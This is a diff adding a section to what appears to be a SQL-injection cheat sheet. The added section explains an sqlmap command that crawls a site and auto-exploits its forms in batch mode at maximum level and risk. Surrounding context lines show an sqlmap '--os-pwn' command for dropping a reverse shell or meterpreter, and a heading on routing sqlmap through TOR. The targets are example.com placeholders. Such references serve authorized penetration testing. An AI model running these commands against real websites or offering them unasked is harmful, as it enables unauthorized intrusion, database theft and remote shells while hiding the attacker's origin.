@@ -138,6 +138,16 @@ Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
 ```
 
+Crawl a website with SQLmap and auto-exploit
+
+```powershell
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+```
+
 Using TOR with SQLmap
 
 ```powershell
